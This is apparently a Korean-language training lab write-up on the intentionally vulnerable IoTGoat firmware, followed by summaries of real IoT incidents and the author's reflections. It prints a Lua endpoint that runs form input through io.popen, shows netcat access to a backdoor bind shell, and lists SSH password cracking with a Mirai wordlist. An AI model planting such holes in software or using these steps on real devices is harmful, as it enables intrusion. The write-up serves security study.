SF:x20MiniUPnPd/2\.1\r\nExt:\r\n\r\n<HTML><HEAD><TITLE>404\x20Not\x20Found
SF:</TITLE></HEAD><BODY><H1>Not\x20Found</H1>The\x20requested\x20URL\x20wa
SF:s\x20not\x20found\x20on\x20this\x20server\.</BODY></HTML>\r\n")%r(RTSPR
SF:equest,12C,"RTSP/1\.0\x20501\x20Not\x20Implemented\r\nContent-Type:\x20
SF:text/html\r\nConnection:\x20close\r\nContent-Length:\x20149\r\nServer:\
SF:x20OpenWRT/18\.06\.2\x20UPnP/1\.1\x20MiniUPnPd/2\.1\r\nExt:\r\n\r\n<HTM
SF:L><HEAD><TITLE>501\x20Not\x20Implemented</TITLE></HEAD><BODY><H1>Not\x2
SF:0Implemented</H1>The\x20HTTP\x20Method\x20is\x20not\x20implemented\x20b
SF:y\x20this\x20server\.</BODY></HTML>\r\n")%r(HTTPOptions,12C,"HTTP/1\.0\
SF:x20501\x20Not\x20Implemented\r\nContent-Type:\x20text/html\r\nConnectio
SF:n:\x20close\r\nContent-Length:\x20149\r\nServer:\x20OpenWRT/18\.06\.2\x
SF:20UPnP/1\.1\x20MiniUPnPd/2\.1\r\nExt:\r\n\r\n<HTML><HEAD><TITLE>501\x20
SF:Not\x20Implemented</TITLE></HEAD><BODY><H1>Not\x20Implemented</H1>The\x
SF:20HTTP\x20Method\x20is\x20not\x20implemented\x20by\x20this\x20server\.<
SF:/BODY></HTML>\r\n")%r(FourOhFourRequest,117,"HTTP/1\.0\x20404\x20Not\x2
SF:0Found\r\nContent-Type:\x20text/html\r\nConnection:\x20close\r\nContent
SF:-Length:\x20134\r\nServer:\x20OpenWRT/18\.06\.2\x20UPnP/1\.1\x20MiniUPn
SF:Pd/2\.1\r\nExt:\r\n\r\n<HTML><HEAD><TITLE>404\x20Not\x20Found</TITLE></
SF:HEAD><BODY><H1>Not\x20Found</H1>The\x20requested\x20URL\x20was\x20not\x
SF:20found\x20on\x20this\x20server\.</BODY></HTML>\r\n")%r(SIPOptions,12B,
SF:"SIP/2\.0\x20501\x20Not\x20Implemented\r\nContent-Type:\x20text/html\r\
SF:nConnection:\x20close\r\nContent-Length:\x20149\r\nServer:\x20OpenWRT/1
SF:8\.06\.2\x20UPnP/1\.1\x20MiniUPnPd/2\.1\r\nExt:\r\n\r\n<HTML><HEAD><TIT
SF:LE>501\x20Not\x20Implemented</TITLE></HEAD><BODY><H1>Not\x20Implemented
SF:</H1>The\x20HTTP\x20Method\x20is\x20not\x20implemented\x20by\x20this\x2
SF:0server\.</BODY></HTML>\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.40 seconds

```
<br>

**숨겨진 페이지 찾기**

<br>

- binwalk를 이용하여 IoTGoat 파일 시스템 추출


```
$ binwalk -eM IoTGoat-raspberry-pi2.img

Scan Time:     2021-01-14 00:54:42
Target File:   /home/kali/Desktop/IoTGoat-raspberry-pi2.img
MD5 Checksum:  9fb28986b3a610fe60f3927bc7dd643b
Signatures:    391

DECIMAL       HEXADECIMAL     DESCRIPTION
-------------------------------------------------------------------------------
4253711       0x40E80F        Copyright string: "copyright does *not* cover user programs that use kernel"
4253946       0x40E8FA        Copyright string: "copyrighted by the Free Software"
4254058       0x40E96A        Copyright string: "copyrighted by me and others who actually wrote it."
4254443       0x40EAEB        Copyright string: "Copyright (C) 1989, 1991 Free Software Foundation, Inc."
4256293       0x40F225        Copyright string: "copyright the software, and"
...
...
29360128      0x1C00000       Squashfs filesystem, little endian, version 4.0, compression:xz, size: 3946402 bytes, 1333 inodes, blocksize: 262144 bytes, created: 2019-01-30 12:21:02

```
<br>

**추출 후 생성된 폴더에서 controller 디렉토리 내 iotgoat.lua 파일 확인**

- admin/iotgoat/cmdinject, admin/iotgoat/cam, admin/iotgoat/door, admin/iotgoat/webcmd 설정 확인

- 접근 시 숨겨진 페이지를 확인할 수 있음

<br>



```
~/Desktop/_IoTGoat-raspberry-pi2.img.extracted/squashfs-root/usr/lib/lua/luci/controller
$ ls
admin  firewall.lua  iotgoat  upnp.lua

$ cd iotgoat
$ ls
iotgoat.lua  sensordata.

$ vim lotgoat.lua
module("luci.controller.iotgoat.iotgoat", package.seeall)
local http = require("luci.http")
function index()
    entry({"admin", "iotgoat"}, firstchild(), "IoTGoat", 60).dependent=false
    entry({"admin", "iotgoat", "cmdinject"}, template("iotgoat/cmd"), "", 1)
    entry({"admin", "iotgoat", "cam"}, template("iotgoat/camera"), "Camera", 2)
    entry({"admin", "iotgoat", "door"}, template("iotgoat/door"), "Doorlock", 3)
    entry({"admin", "iotgoat", "webcmd"}, call("webcmd"))
end

function webcmd()
    local cmd = http.formvalue("cmd")
    if cmd then
        local fp = io.popen(tostring(cmd).." 2>&1")
        local result =  fp:read("*a")
        fp:close()
        result = result:gsub("<", "&lt;")
        http.write(tostring(result))
    else
        http.write_json(http.formvalue())
    end
end
```

<br>
<br>

<img width="887" height="636" alt="Image" src="https://github.com/user-attachments/assets/63348b4b-e4ce-4427-b620-6c3175994b94" />

<br>
<br>
<img width="884" height="247" alt="Image" src="https://github.com/user-attachments/assets/4f836f64-7322-4cdd-9a29-17cabb571863" />
<br>
<img width="885" height="229" alt="Image" src="https://github.com/user-attachments/assets/612f6d78-907f-463d-bb45-5db7734b1894" />
<br>
<img width="886" height="187" alt="Image" src="https://github.com/user-attachments/assets/9ec0089f-2676-4244-af00-1b7186d992cc" />
<br>

<br>

**webshell을 이용하여 쉘 획득 시도**
<br>
<br>

- '2-1에서 nmap을 통해 포트가 열려있는 서비스를 확인하였음

<br>

```
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
443/tcp   open  https
5000/tcp  open  upnp
5515/tcp  open  unknown
65534/tcp open  unknown

```

<br>

- 서비스가 unknown으로 확인되는 5515 포트를 이용하여 바인드쉘 획득

<br>


```
$ nc -nv 192.168.64.133 5515                                                                                                                         1 ⨯
(UNKNOWN) [192.168.64.133] 5515 (?) open
[***]Successfully Connected to IoTGoat's Backdoor[***]
ls
bin
boot
dev
dnsmasq_setup.sh
etc
lib
mnt
overlay
proc
rom
root
sbin
sys
tmp
usr
var
www
```

<br>

<br>

### 실습 내용 정리

| 단계 | 설명 | 주요 발견 / 사용 도구 |
| --- | --- | --- |
| **인증정보 획득** | 추출된 파일 시스템 내 `/etc/passwd`, `/etc/shadow` 파일 분석 | 사용자 `root`, `iotgoatuser` 계정 존재 ／ 암호 해시 형식 `$1$` → MD5 계열 해시  |
| **비밀번호 크랙 시도** | 일반적으로 알려진 IoT 관련 패스워드 목록 활용 | `SecLists` 미라이 봇넷 암호 리스트 사용 `medusa` 도구로 SSH 로그인 시도  |
| **서비스 스캔 및 버전 탐지** | `nmap` 이용하여 오픈 포트 및 서비스 버전 확인 | 포트: 22 (SSH), 53 (DNS), 80 (HTTP), 443 (HTTPS), 5000 (UPnP) 등 오픈  UPnP 서비스: `MiniUPnPd 2.1` 버전 확인 |
| **숨겨진 페이지 탐색** | 펌웨어 내부의 Luci (OpenWRT 웹 관리자) 스크립트 분석 | `luci.controller.iotgoat.iotgoat.lua` 내 `admin/iotgoat/...` 경로 정의 발견 명령 주입 가능한 `webcmd` 엔드포인트 존재 ＝ |
| **쉘 획득** | 백도어 포트 또는 인터넷 연결 서비스 이용 | 포트 5515 (unknown 서비스) 사용하여 바인드 쉘 접근 성공 ／ 쉘 진입 후 `ls` 등 명령 수행 가능  |


<br>

펌웨어 분석을 통해 하드코딩된 사용자 계정과 암호 해시를 파악할 수 있고, 비밀번호 사전 공격 (예: 유명 IoT 약한 비밀번호 리스트) 으로 실제 로그인까지 할 수 있고,

웹 인터페이스 코드 분석을 통해 숨겨진 관리자 페이지, 명령 실행 포인트가 존재함을 확인할 수 있고, **비표준 포트 (unknown 서비스 포트)**을 통해 백도어나 쉘을 획득하는 공격 경로가 실제로 존재할 수 있다는 걸 보여주고 있었다.



<br>

### Connected System 취약점 발생 사례 정리

**Mirai IoT 봇넷 (2016)**

**요약** : Mirai는 인터넷에 연결된 취약한 IP 카메라·가정용 라우터 등을 대량으로 감염시켜 봇넷을 만들고, 2016년 Dyn DNS 서비스에 대한 대규모 DDoS를 유발해 여러 대형 웹사이트 접속 장애를 일으켰다.
단순 기본 계정·비밀번호로 장비를 탈취한 것이 핵심 원인이다.

추가 내용 : Mirai 멀웨어는 인터넷에서 취약한 IoT 장치를 지속적으로 스캔한 다음 감염되어 봇넷 공격에 사용된다.  봇넷 멀웨어는 컴퓨터를 감염시키고 공격자의 C2 인프라에 대한 명령 및 제어(C2) 채널을 연다.

이를 통해 공격자는 감염된 시스템의 리소스를 사용하여 봇넷 멀웨어에 명령을 보낼 수 있으며, 감염된 디바이스가 많기 때문에 봇넷은 DDoS 또는 [크리덴셜 스터핑](https://www.checkpoint.com/kr/cyber-hub/threat-prevention/what-is-credential-stuffing/)과 같은 대규모 자동화 공격을 수행할 수 있다.

<br>

[출처]

[Mirai 및 기타 봇넷으로 인한 DDoS 위협 증가 | 시사](https://www.cisa.gov/news-events/alerts/2016/10/14/heightened-ddos-threat-posed-mirai-and-other-botnets?utm_source=chatgpt.com)

[Mirai Botnet 멀웨어 - 체크 포인트 소프트웨어](https://www.checkpoint.com/kr/cyber-hub/network-security/what-is-iot/iot-botnet/mirai-botnet-malware/)

---

**아파트 ‘월패드’ 대규모 해킹 (약 40만 세대, 2021~2022 관련 사건)**

**요약** : 아파트 내 거실·현관용 스마트 단말기(월패드)를 해킹해 내부 영상·사진을 수집·유출하려 한 사건. 

경찰 수사에서 전국 638개 단지, 약 40만여 세대가 피해 대상에 포함된 것으로 보고되었고 피의자가 검거·기소됨. 공격 경로는 중앙관리서버·공용 네트워크 약점 이용 등으로 보도됨.

추가 내용:  불특정 다수가 사용하는 공용 인터넷 공유기 10개를 먼저 해킹해 접속 권한을 얻고 이후 공유기를 거쳐 아파트 단지 중앙관리서버로 침입 .

추적을 피하기 위해 서버에서 접속자 기록을 확인해도 공유기 인터넷주소(IP주소)만 남도록 함.

<br>

[출처]

[아파트 40만 가구 월패드 해킹해 영상 유출… 보안전문가 체포｜동아일보](https://www.donga.com/news/Society/article/all/20221220/117089464/1?utm_source=chatgpt.com)

---

**스마트팜·OT(운영기술) 대상 공격 [스마트팩토리·스마트팜 마비 사례(2023)]**

**요약** : 2023년을 전후로 국내 스마트팜·산업 OT 시스템을 노린 외국 해킹조직의 공격(일부는 서비스 중단·장비 제어 시도)이 보고되었고, OT·ICS 보안 위험성이 제기됨. OT 대상 랜섬웨어·제어망 침투 사례도 다수 보도됨.

추가 내용 : 제조업은 시스템 중단 시 시간당 손실액이 크다는 점에서 해커 조직의 공격 대상이 되기도 함. 랜섬웨어에 감염되거나 OT 시스템 운영 권한을 탈취당할 경우 이를 해제하는 조건으로 거액의 보상을 지급할 가능성이 높음

<br>

[출처]

["한국 제조업 시스템, 해킹에 무방비 노출"](https://v.daum.net/v/20250707160204966?utm_source=chatgpt.com)

<br>

---
### 주제를 조사하고나서 느낀 점
<br>

- 선택한 주제들이 공통적인 부분들이 있기에 공부하면서 이미 느낀 부분이지만, 우리가 흔히 주변에서 볼 수 있는 널린 기기들이 모두 공격표면이라는 사실이 불안하면서도, 그만큼 개선의 여지가 많아 배울 게 많다는 점에서 해당 주제들이 더욱 흥미롭게 느껴졌고, 더 공부하고 싶다는 생각이 들었다.
  
- IoT의 약점은 단순한 구성과 편의성의 산물이라는 느낌을 강하게 받았다. 기본 비밀번호, 공개된 포트, 서명 없는 펌웨어 같은 ‘사소한 실수’에서 비롯되어 조사한 사례들 처럼 대규모 사고로 이어진다는 게 인상 깊었다.

- 시스템 전체를 보면 취약점은 개별 장치가 아니라 에코시스템(앱·클라우드·백엔드·네트워크)의 연쇄적 취약성에서 나온다
     - 이를 통해 한 부분만 고쳐서는 부족하다는 깨달았다.

  <br>

  
